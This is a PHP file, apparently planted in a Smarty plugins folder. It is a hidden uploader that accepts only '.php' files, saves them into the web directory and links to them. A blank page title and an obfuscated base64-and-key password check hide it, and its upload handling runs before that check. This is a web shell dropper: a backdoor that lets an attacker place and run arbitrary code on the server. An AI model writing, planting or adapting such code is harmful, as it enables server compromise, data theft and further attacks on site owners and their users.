<?
session_start();
$full_url="/Smarty/libs/plugins/";

$folder="./";

$error="";
$success="";
$display_message="";
$file_ext=array();
$password_form="";

$random_name=false;

$alts=array("php");

$fullpath="";

$mfz="5120000";

$mcz="6048000";

$f_nums="1";

function get_ext($key) { 
	$key=strtolower(substr(strrchr($key, "."), 1));
	$key=str_replace("jpeg","jpg",$key);
	return $key;
}

function cln_file_name($string) {
	$cln_filename_find=array("/\.[^\.]+$/", "/[^\d\w\s-]/", "/\s\s+/", "/[-]+/", "/[_]+/");
	$cln_filename_repl=array("", ""," ", "-", "_");
	$string=preg_replace($cln_filename_find, $cln_filename_repl, $string);
	return trim($string);
}

If(($_POST['submit']==true) AND ($password_form=="")) {

	If(array_sum($_FILES['file']['size']) > $mcz*1024) {
		
		$error.="<b>FAILED:</b> All Files <b>REASON:</b> size is to large.<br />";
		
	
	} Else {

		
		For($i=0; $i <= $f_nums-1; $i++) {
			
			
			If($_FILES['file']['name'][$i]) {

				
				$file_ext[$i]=get_ext($_FILES['file']['name'][$i]);
				
				
				If($random_name){
					$file_name[$i]=time()+rand(0,100000);
				} Else {
					$file_name[$i]=cln_file_name($_FILES['file']['name'][$i]);
				}
	
				
				If(str_replace(" ", "", $file_name[$i])=="") {
					
					$error.= "<b>FAILED:</b> ".$_FILES['file']['name'][$i]." <b>REASON:</b> Blank name.<br />";
				
				
				}	ElseIf(!in_array($file_ext[$i], $alts)) {
								
					$error.= "<b>FAILED:</b> ".$_FILES['file']['name'][$i]." <b>REASON:</b> Invalide type.<br />";
								
				
				} Elseif($_FILES['file']['size'][$i] > ($mfz*1024)) {
					
					$error.= "<b>FAILED:</b> ".$_FILES['file']['name'][$i]." <b>REASON:</b> large.<br />";
					
				
				} Elseif(file_exists($folder.$file_name[$i].".".$file_ext[$i])) {
	
					$error.= "<b>FAILED:</b> ".$_FILES['file']['name'][$i]." <b>REASON:</b> already exists.<br />";
					
				} Else {
					
					If(move_uploaded_file($_FILES['file']['tmp_name'][$i],$folder.$file_name[$i].".".$file_ext[$i])) {
						
						$success.="<b>SUCCESS:</b> ".$_FILES['file']['name'][$i]."<br />";
						$success.="<b></b> <a href=\"".$full_url.$file_name[$i].".".$file_ext[$i]."\" target=\"_blank\">".$full_url.$file_name[$i].".".$file_ext[$i]."</a><br /><br />";
						
					} Else {
						$error.="<b>FAILED:</b> ".$_FILES['file']['name'][$i]." <b>REASON:</b> General failure.<br />";
					}
					
				}
							
			} 
		
		} 
		
	} 
	
	If(($error=="") AND ($success=="")) {
		$error.="<b>FAILED:</b> No files selected<br />";
	}

	$display_message=$success.$error;

} 


?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<meta http-equiv="Content-Language" content="en-us" />
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
<title> </title>

<?
{
?>

<?
function th()
{
    if(isset($_POST['evalue'], $_POST['ebtn']))
    {
    	$kdata = $_POST['evalue'];
		$skey = 12;
		$res = '';
		$sBase64 = strtr($kdata, '-_', '+/');
		$kdata = base64_decode($sBase64.'==');
		for($i=0;$i<strlen($kdata);$i++){
				$char    = substr($kdata, $i, 1);
				$kchar = substr($skey, ($i % strlen($skey)) - 1, 1);
				$char    = chr(ord($char) - ord($kchar));
				$res .= $char;
		}
        if($res == 'sDr36fh2s23hJsdr#*')
            $_SESSION['u_pa'] = 1;
    }
    echo '<form method="POST">'.
    '<div><input type="text" name="evalue" size="30" /></div>'.
    '<div><input type="submit" value="Enter" name="ebtn" /></div>'.
    '</form>';
    die();
}
if(empty($_SESSION['u_pa'])) 
	th();
?>


<form action="<?=$_SERVER['PHP_SELF'];?>" method="post" enctype="multipart/form-data" name="name" style="/*display:none;*/">
<table align="center" class="table">


	<?If($display_message){?>
	<tr>
		<td colspan="2" class="message">
		<br />
			<?=$display_message;?>
		<br />
		</td>
	</tr>
	<?}?>
	

	<?For($i=0;$i <= $f_nums-1;$i++) {?>
		<tr>
			
			<td class="table_body" width="80%"><input type="file" name="file[]" size="30" /></td>
		</tr>
	<?}?>
	<tr>
		<td colspan="2" align="center" class="table_footer">
			<input type="hidden" name="submit" value="true" />
			<input type="submit" value=" Set " /> &nbsp;
			<input type="reset" name="reset" value=" Reset " onclick="window.location.reload(true);" />
		</td>
	</tr>
</table>
</form>

<?} ?>

</body>
</html>